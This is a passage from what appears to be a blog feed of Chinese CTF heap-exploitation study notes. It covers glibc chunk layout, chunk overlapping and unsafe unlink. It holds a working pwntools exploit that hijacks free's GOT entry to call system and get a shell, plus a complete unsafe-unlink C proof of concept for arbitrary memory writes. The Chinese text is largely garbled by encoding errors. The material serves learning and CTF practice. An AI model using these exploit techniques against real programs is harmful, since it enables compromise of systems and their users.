class="line">    io.sendline(<span class="string">b'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">b'aaaa'</span>)</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b'bbbb'</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b'/bin/sh\x00'</span> + <span class="string">b'a'</span> * <span class="number">0x10</span> + <span class="string">b'\x41'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(free_got))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">b'Content : '</span>)</span><br><span class="line">data = io.recvuntil(<span class="string">b'Done !'</span>)</span><br><span class="line">free_addr = u64(data.split(<span class="string">b'\n'</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr: '</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin_attack"></a>fastbin_attack</h1><h2 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h2><h3 id="checksec-3"><a href="#checksec-3" class="headerlink" title="checksec"></a>checksec</h3><p><img src="/2024/07/28/heap-practice/oreo_1.png"></p><p>32ä½ç¨‹åºï¼Œå¼€å¯äº†Canaryå’ŒNXä¿æŠ¤</p><h3 id="ida-2"><a href="#ida-2" class="headerlink" title="ida"></a>ida</h3><p>æ­¥æªçš„åŸºæœ¬ç»“æ„å¦‚ä¸‹</p><p><img src="/2024/07/28/heap-practice/oreo_2.png"></p><h2 id="2015-9447-CTF-Search-Engine"><a href="#2015-9447-CTF-Search-Engine" class="headerlink" title="2015 9447 CTF : Search Engine"></a>2015 9447 CTF : Search Engine</h2><h3 id="checksec-4"><a href="#checksec-4" class="headerlink" title="checksec"></a>checksec</h3><p><img src="/2024/07/28/heap-practice/search_1.png"></p><p>64ä½ç¨‹åºï¼Œé™¤äº†PIEå…¶ä»–ä¿æŠ¤å…¨å¼€</p><h3 id="ida-gdb"><a href="#ida-gdb" class="headerlink" title="ida + gdb"></a>ida + gdb</h3>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>heap_study</title>
      <link href="/2024/07/15/heap-study/"/>
      <url>/2024/07/15/heap-study/</url>
      
        <content type="html"><![CDATA[<p>heap_study<span id="more"></span></p><figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">+-------------------+  &lt;- chunkèµ·å§‹åœ°å€(ä½åœ°å€)</span><br><span class="line">| Prev Size (å¯é€‰)  |</span><br><span class="line">+-------------------+</span><br><span class="line">|      Size         |</span><br><span class="line">+-------------------+</span><br><span class="line">|       fd          |</span><br><span class="line">+-------------------+</span><br><span class="line">|       bk          |</span><br><span class="line">+-------------------+</span><br><span class="line">|                   |</span><br><span class="line">|     ç”¨æˆ·æ•°æ®       |</span><br><span class="line">|                   |</span><br><span class="line">+-------------------+  &lt;- chunkç»“æŸåœ°å€(é«˜åœ°å€)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h1 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h1><p><strong>æ¡ä»¶</strong>  </p><ul><li>ç¨‹åºä¸­å­˜åœ¨åŸºäºå †çš„æ¼æ´</li><li>æ¼æ´å¯ä»¥æ§åˆ¶ chunk header ä¸­çš„æ•°æ®</li></ul><p><strong>chunk extendå¯ä»¥åšä»€ä¹ˆ</strong></p><p>è¿™ç§æŠ€æœ¯å¹¶ä¸èƒ½ç›´æ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œä½†æ˜¯å¯ä»¥æ§åˆ¶ chunk ä¸­çš„å†…å®¹ã€‚å¦‚æœ chunk å­˜åœ¨å­—ç¬¦ä¸²æŒ‡é’ˆã€å‡½æ•°æŒ‡é’ˆç­‰ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™äº›æŒ‡é’ˆæ¥è¿›è¡Œä¿¡æ¯æ³„æ¼å’Œæ§åˆ¶æ‰§è¡Œæµç¨‹ã€‚æ­¤å¤–é€šè¿‡ extend å¯ä»¥å®ç° chunk overlappingï¼Œé€šè¿‡ overlapping å¯ä»¥æ§åˆ¶ chunk çš„ fd/bk æŒ‡é’ˆä»è€Œå¯ä»¥å®ç° fastbin attack ç­‰åˆ©ç”¨ã€‚</p><h2 id="å¯¹inuseçš„fastbinè¿›è¡Œextend"><a href="#å¯¹inuseçš„fastbinè¿›è¡Œextend" class="headerlink" title="å¯¹inuseçš„fastbinè¿›è¡Œextend"></a>å¯¹inuseçš„fastbinè¿›è¡Œextend</h2><p><img src="/2024/07/15/heap-study/overlapping_1.png"></p><h2 id="å¯¹inuseçš„smallbinè¿›è¡Œextend"><a href="#å¯¹inuseçš„smallbinè¿›è¡Œextend" class="headerlink" title="å¯¹inuseçš„smallbinè¿›è¡Œextend"></a>å¯¹inuseçš„smallbinè¿›è¡Œextend</h2><p><img src="/2024/07/15/heap-study/overlapping_2.png"></p><h2 id="å¯¹-free-çš„-smallbin-è¿›è¡Œ-extend"><a href="#å¯¹-free-çš„-smallbin-è¿›è¡Œ-extend" class="headerlink" title="å¯¹ free çš„ smallbin è¿›è¡Œ extend"></a>å¯¹ free çš„ smallbin è¿›è¡Œ extend</h2><p>ä¸å‰ä¸€ä¸ªç›¸åŒåªä¸è¿‡ä¸éœ€è¦é˜²æ­¢ä¸top_chunkåˆå¹¶</p><h2 id="é€šè¿‡-extend-åå‘-overlapping"><a href="#é€šè¿‡-extend-åå‘-overlapping" class="headerlink" title="é€šè¿‡ extend åå‘ overlapping"></a>é€šè¿‡ extend åå‘ overlapping</h2><h2 id="é€šè¿‡-extend-å‰å‘-overlapping"><a href="#é€šè¿‡-extend-å‰å‘-overlapping" class="headerlink" title="é€šè¿‡ extend å‰å‘ overlapping"></a>é€šè¿‡ extend å‰å‘ overlapping</h2><p><img src="/2024/07/15/heap-study/overlapping_3.png"><br>é€šè¿‡unlinkè¿›è¡Œå‘å‰çš„overlapping</p><h1 id="unsafe-unlink-glibc2-31"><a href="#unsafe-unlink-glibc2-31" class="headerlink" title="unsafe_unlink(glibc2.31)"></a>unsafe_unlink(glibc2.31)</h1><h2 id="å‘å‰åˆå¹¶å‘ååˆå¹¶"><a href="#å‘å‰åˆå¹¶å‘ååˆå¹¶" class="headerlink" title="å‘å‰åˆå¹¶å‘ååˆå¹¶"></a>å‘å‰åˆå¹¶å‘ååˆå¹¶</h2><p>å½“ä¸¤ä¸ªfreeçš„å †å—åœ¨ç‰©ç†ä¸Šç›¸é‚»æ—¶ï¼Œä¼šå°†ä»–ä»¬åˆå¹¶ï¼Œå¹¶å°†åŸæ¥freeçš„å †å—åœ¨åŸæ¥çš„é“¾è¡¨ä¸­è§£é“¾ï¼ŒåŠ å…¥æ–°çš„é“¾è¡¨ä¸­ã€‚è¿™é‡Œçš„å‘å‰å³ä½åœ°å€çš„chunkè€Œéfdï¼ŒbkæŒ‡é’ˆæ‰€æŒ‡çš„chunkï¼ˆå‘ååŒç†ï¼‰ï¼Œä»¥å½“å‰chunkä¸ºåŸºå‡†ï¼Œå°†next_free_chunkä¸å½“å‰chunkåˆå¹¶ä¸ºå‘å‰åˆå¹¶ï¼Œå°†previous_free_chunkä¸å½“å‰chunkåˆå¹¶ä¸ºå‘ååˆå¹¶ã€‚</p><h3 id="å‘ååˆå¹¶"><a href="#å‘ååˆå¹¶" class="headerlink" title="å‘ååˆå¹¶"></a>å‘ååˆå¹¶</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*malloc.c  int_freeå‡½æ•°ä¸­*/</span><span class="comment">/*è¿™é‡ŒpæŒ‡å‘å½“å‰malloc_chunkç»“æ„ä½“ï¼Œbckå’Œfwdåˆ†åˆ«ä¸ºå½“å‰chunkçš„å‘åå’Œå‘å‰ä¸€ä¸ªfree chunk*/</span></span><br><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) {</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;<span class="comment">//ä¿®æ”¹æŒ‡å‘å½“å‰chunkçš„æŒ‡é’ˆï¼ŒæŒ‡å‘å‰ä¸€ä¸ªchunkã€‚</span></span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      unlink(p, bck, fwd);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr)(((char*)(p)) + (s)))</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="å‘å‰åˆå¹¶"><a href="#å‘å‰åˆå¹¶" class="headerlink" title="å‘å‰åˆå¹¶"></a>å‘å‰åˆå¹¶</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) {</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) {</span><br><span class="line">unlink(nextchunk, bck, fwd);</span><br><span class="line">    size += nextsize;</span><br><span class="line">} <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_inuse_bit_at_offset(p, s)</span></span><br><span class="line">(((mchunkptr)(((<span class="type">char</span>*)(p)) + (s)))-&gt;size &amp;= ~(PREV_INUSE))</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) {                                            </span></span><br><span class="line">    FD = P-&gt;fd;                                                               </span><br><span class="line">    BK = P-&gt;bk;                                                               </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                     </span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> {                                                                    </span><br><span class="line">        FD-&gt;bk = BK;                                                          </span><br><span class="line">        BK-&gt;fd = FD;                                                          </span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                                      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) {                           </span><br><span class="line">            ......                                                            </span><br><span class="line">          }                                                                   </span><br><span class="line">      }                                                                       </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to unsafe unlink 2.0!\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 20.04 64bit.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"æ¬¢è¿æ¥åˆ°unsafe unlink 2.0!\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"åœ¨64ä½çš„Ubuntu 20.04ä¸Šæµ‹è¯•ã€‚\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"å½“ä½ æœ‰ä¸€ä¸ªå·²çŸ¥ä½ç½®çš„æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªå¯ä»¥è°ƒç”¨unlinkçš„åŒºåŸŸæ—¶ï¼Œè¿™ç§æŠ€æœ¯å¯ä»¥è¢«ä½¿ç”¨ã€‚\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"æœ€å¸¸è§çš„åœºæ™¯æ˜¯ä¸€ä¸ªå¯ä»¥æº¢å‡ºçš„æ˜“å—æ”»å‡»çš„ç¼“å†²åŒºå¹¶ä¸”æœ‰ä¸€ä¸ªå…¨å±€æŒ‡é’ˆã€‚\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">// we want to be big enough not to use tcache or fastbin æˆ‘ä»¬å¸Œæœ›å¤§å°è¶³å¤Ÿå¤§ï¼Œä¸ä½¿ç”¨tcacheæˆ–fastbin</span></span><br><span class="line">    <span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¿™ä¸ªç»ƒä¹ çš„ç›®çš„æ˜¯ä½¿ç”¨freeæ¥ç ´åå…¨å±€chunk0_pträ»¥å®ç°ä»»æ„å†…å­˜å†™å…¥ã€‚\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">// chunk0</span></span><br><span class="line">    <span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">// chunk1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The global chunk0_ptr is at %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"å…¨å±€chunk0_ptråœ¨%pï¼ŒæŒ‡å‘%p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The victim chunk we are going to corrupt is at %p\n\n"</span>, chunk1_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"æˆ‘ä»¬è¦ç ´åçš„å—å®³è€…chunkåœ¨%p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"We create a fake chunk inside chunk0.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"æˆ‘ä»¬åœ¨chunk0å†…åˆ›å»ºä¸€ä¸ªä¼ªé€ çš„chunkã€‚\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"æˆ‘ä»¬è®¾ç½®ä¼ªé€ chunkçš„å¤§å°ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥ç»•è¿‡åœ¨https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44fä¸­å¼•å…¥çš„æ£€æŸ¥\n"</span>);</span><br><span class="line">    chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"æˆ‘ä»¬å°†ä¼ªé€ chunkçš„'next_free_chunk' (fd)è®¾ç½®ä¸ºæŒ‡å‘æ¥è¿‘&amp;chunk0_ptrçš„ä½ç½®ï¼Œä»¥ä¾¿P-&gt;fd-&gt;bk = Pã€‚\n"</span>);</span><br><span class="line">    chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr - (<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>) * <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"æˆ‘ä»¬å°†ä¼ªé€ chunkçš„'previous_free_chunk' (bk)è®¾ç½®ä¸ºæŒ‡å‘æ¥è¿‘&amp;chunk0_ptrçš„ä½ç½®ï¼Œä»¥ä¾¿P-&gt;bk-&gt;fd = Pã€‚\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"é€šè¿‡è¿™ç§è®¾ç½®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ£€æŸ¥ï¼š(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">    chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr - (<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>) * <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Fake chunk fd: %p\n"</span>, (<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ä¼ªé€ chunkçš„fd: %p\n"</span>, (<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Fake chunk bk: %p\n\n"</span>, (<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ä¼ªé€ chunkçš„bk: %p\n\n"</span>, (<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"æˆ‘ä»¬å‡è®¾æˆ‘ä»¬åœ¨chunk0ä¸­æœ‰ä¸€ä¸ªæº¢å‡ºï¼Œå¯ä»¥è‡ªç”±åœ°æ›´æ”¹chunk1çš„å…ƒæ•°æ®ã€‚\n"</span>);</span><br><span class="line">    <span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"æˆ‘ä»¬ç¼©å°chunk0çš„å¤§å°ï¼ˆå­˜å‚¨ä¸ºchunk1ä¸­çš„'previous_size'ï¼‰ï¼Œä»¥ä¾¿freeä¼šè®¤ä¸ºchunk0ä»æˆ‘ä»¬æ”¾ç½®ä¼ªé€ chunkçš„ä½ç½®å¼€å§‹ã€‚\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"é‡è¦çš„æ˜¯æˆ‘ä»¬çš„ä¼ªé€ chunkæ­£å¥½ä»å·²çŸ¥æŒ‡é’ˆæŒ‡å‘çš„ä½ç½®å¼€å§‹ï¼Œå¹¶ä¸”æˆ‘ä»¬ç›¸åº”åœ°ç¼©å°chunkã€‚\n"</span>);</span><br><span class="line">    chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n"</span>, (<span class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"å¦‚æœæˆ‘ä»¬'æ­£å¸¸'åœ°é‡Šæ”¾äº†chunk0ï¼Œchunk1.previous_sizeåº”è¯¥æ˜¯0x430ï¼Œä½†ç°åœ¨å®ƒçš„æ–°å€¼æ˜¯ï¼š%p\n"</span>, (<span class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"æˆ‘ä»¬é€šè¿‡å°†chunk1çš„'previous_in_use'æ ‡è®°ä¸ºFalseæ¥æ ‡è®°æˆ‘ä»¬çš„ä¼ªé€ chunkä¸ºå·²é‡Šæ”¾ã€‚\n\n"</span>);</span><br><span class="line">    chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ç°åœ¨æˆ‘ä»¬é‡Šæ”¾chunk1ï¼Œä»¥ä¾¿å‘ååˆå¹¶æ—¶å°†unlinkæˆ‘ä»¬çš„ä¼ªé€ chunkï¼Œè¦†ç›–chunk0_ptrã€‚\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You can find the source of the unlink_chunk function at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=1ecba1fafc160ca70f81211b23f688df8676e612\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ä½ å¯ä»¥åœ¨https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=1ecba1fafc160ca70f81211b23f688df8676e612æ‰¾åˆ°unlink_chunkå‡½æ•°çš„æºä»£ç \n\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"æ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨chunk0_ptrè¦†ç›–è‡ªèº«ä»¥æŒ‡å‘ä»»æ„ä½ç½®ã€‚\n"</span>);</span><br><span class="line">    <span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(victim_string, <span class="string">"Hello!~"</span>);</span><br><span class="line">    chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"chunk0_ptrç°åœ¨æŒ‡å‘æˆ‘ä»¬æƒ³è¦çš„ä½ç½®ï¼Œæˆ‘ä»¬ä½¿ç”¨å®ƒæ¥è¦†ç›–æˆ‘ä»¬çš„å—å®³å­—ç¬¦ä¸²ã€‚\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Original value: %s\n"</span>, victim_string);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"åŸå§‹å€¼ï¼š%s\n"</span>, victim_string);</span><br><span class="line">    chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"New Value: %s\n"</span>, victim_string);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"æ–°å€¼ï¼š%s\n"</span>, victim_string);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check å¥å…¨æ€§æ£€æŸ¥</span></span><br><span class="line">    assert(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>åˆ†é…å®Œä¸¤ä¸ªchunkå<br><img src="/2024/07/15/heap-study/unsafe_unlink_1.png"><br>æˆ‘ä»¬åˆ©ç”¨chunk0_ptræ„é€ ä¸€ä¸ªfake_chunkæ¥ç»•è¿‡unlinkçš„æ£€æŸ¥<br><img src="/2024/07/15/heap-study/unsafe_unlink_2.png"><br><img 